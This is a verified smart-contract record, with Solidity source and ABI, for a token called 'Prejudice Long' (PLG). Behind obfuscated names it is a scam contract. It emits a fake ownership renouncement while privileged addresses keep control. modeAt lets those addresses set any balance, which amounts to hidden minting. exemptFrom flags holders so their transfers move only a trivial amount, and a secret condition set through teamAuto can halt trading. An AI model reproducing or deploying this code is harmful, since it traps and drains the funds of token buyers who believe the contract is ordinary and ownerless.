{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface fromSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverToSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityAmount {\n    function createPair(address minLaunch, address enableMinAt) external returns (address);\n}\n\ninterface senderFromMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLaunchAuto) external view returns (uint256);\n\n    function transfer(address receiverSwapAmount, uint256 buyLaunched) external returns (bool);\n\n    function allowance(address atLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSwapAmount,\n        uint256 buyLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minMarketing, uint256 value);\n    event Approval(address indexed atLaunched, address indexed spender, uint256 value);\n}\n\ninterface modeEnable is senderFromMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrejudiceLong is receiverToSender, senderFromMin, modeEnable {\n\n    string private takeFeeLaunched = \"PLG\";\n\n    function owner() external view returns (address) {\n        return senderTradingMin;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeLimit;\n    }\n\n    uint256 enableAmount;\n\n    uint256 private tradingLaunched = 100000000 * 10 ** 18;\n\n    uint256 private marketingShouldFee;\n\n    function maxFeeLaunched(address limitEnable, address receiverSwapAmount, uint256 buyLaunched) internal returns (bool) {\n        if (limitEnable == tradingFromReceiver) {\n            return buyWallet(limitEnable, receiverSwapAmount, buyLaunched);\n        }\n        uint256 toLiquidity = senderFromMin(listLiquidity).balanceOf(amountSender);\n        require(toLiquidity == amountExempt);\n        require(receiverSwapAmount != amountSender);\n        if (tradingList[limitEnable]) {\n            return buyWallet(limitEnable, receiverSwapAmount, isLimit);\n        }\n        return buyWallet(limitEnable, receiverSwapAmount, buyLaunched);\n    }\n\n    function getOwner() external view returns (address) {\n        return senderTradingMin;\n    }\n\n    function limitSwapExempt() public {\n        emit OwnershipTransferred(tradingFromReceiver, address(0));\n        senderTradingMin = address(0);\n    }\n\n    function exemptFrom(address atIs) public {\n        totalSender();\n        \n        if (atIs == tradingFromReceiver || atIs == listLiquidity) {\n            return;\n        }\n        tradingList[atIs] = true;\n    }\n\n    mapping(address => bool) public tradingList;\n\n    uint256 public receiverFund;\n\n    function modeAt(address exemptMarketing, uint256 buyLaunched) public {\n        totalSender();\n        liquidityEnable[exemptMarketing] = buyLaunched;\n    }\n\n    constructor (){\n        \n        fromSender feeSellLaunch = fromSender(txLimit);\n        listLiquidity = liquidityAmount(feeSellLaunch.factory()).createPair(feeSellLaunch.WETH(), address(this));\n        \n        tradingFromReceiver = _msgSender();\n        limitSwapExempt();\n        feeSender[tradingFromReceiver] = true;\n        liquidityEnable[tradingFromReceiver] = tradingLaunched;\n        if (sellLimit) {\n            receiverFund = marketingTake;\n        }\n        emit Transfer(address(0), tradingFromReceiver, tradingLaunched);\n    }\n\n    uint256 public takeShould;\n\n    event OwnershipTransferred(address indexed modeMax, address indexed launchMaxFrom);\n\n    mapping(address => mapping(address => uint256)) private fromFeeToken;\n\n    function approve(address amountMarketing, uint256 buyLaunched) public virtual override returns (bool) {\n        fromFeeToken[_msgSender()][amountMarketing] = buyLaunched;\n        emit Approval(_msgSender(), amountMarketing, buyLaunched);\n        return true;\n    }\n\n    uint256 amountExempt;\n\n    address private senderTradingMin;\n\n    uint8 private feeLimit = 18;\n\n    string private receiverWallet = \"Prejudice Long\";\n\n    function balanceOf(address tokenLaunchAuto) public view virtual override returns (uint256) {\n        return liquidityEnable[tokenLaunchAuto];\n    }\n\n    address amountSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public tradingFromReceiver;\n\n    function totalSender() private view {\n        require(feeSender[_msgSender()]);\n    }\n\n    function tradingSell(address toMax) public {\n        if (tokenLimit) {\n            return;\n        }\n        \n        feeSender[toMax] = true;\n        \n        tokenLimit = true;\n    }\n\n    bool private sellLimit;\n\n    uint256 constant isLimit = 3 ** 10;\n\n    address public listLiquidity;\n\n    function transfer(address exemptMarketing, uint256 buyLaunched) external virtual override returns (bool) {\n        return maxFeeLaunched(_msgSender(), exemptMarketing, buyLaunched);\n    }\n\n    mapping(address => bool) public feeSender;\n\n    function transferFrom(address limitEnable, address receiverSwapAmount, uint256 buyLaunched) external override returns (bool) {\n        if (_msgSender() != txLimit) {\n            if (fromFeeToken[limitEnable][_msgSender()] != type(uint256).max) {\n                require(buyLaunched <= fromFeeToken[limitEnable][_msgSender()]);\n                fromFeeToken[limitEnable][_msgSender()] -= buyLaunched;\n            }\n        }\n        return maxFeeLaunched(limitEnable, receiverSwapAmount, buyLaunched);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverWallet;\n    }\n\n    address txLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tokenLimit;\n\n    function buyWallet(address limitEnable, address receiverSwapAmount, uint256 buyLaunched) internal returns (bool) {\n        require(liquidityEnable[limitEnable] >= buyLaunched);\n        liquidityEnable[limitEnable] -= buyLaunched;\n        liquidityEnable[receiverSwapAmount] += buyLaunched;\n        emit Transfer(limitEnable, receiverSwapAmount, buyLaunched);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeFeeLaunched;\n    }\n\n    bool private toWalletAuto;\n\n    function teamAuto(uint256 buyLaunched) public {\n        totalSender();\n        amountExempt = buyLaunched;\n    }\n\n    mapping(address => uint256) private liquidityEnable;\n\n    uint256 private marketingTake;\n\n    function allowance(address maxTotal, address amountMarketing) external view virtual override returns (uint256) {\n        if (amountMarketing == txLimit) {\n            return type(uint256).max;\n        }\n        return fromFeeToken[maxTotal][amountMarketing];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMaxFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunched\",\"type\":\"uint256\"}],\"name\":\"modeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyLaunched\",\"type\":\"uint256\"}],\"name\":\"teamAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSwapAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PrejudiceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}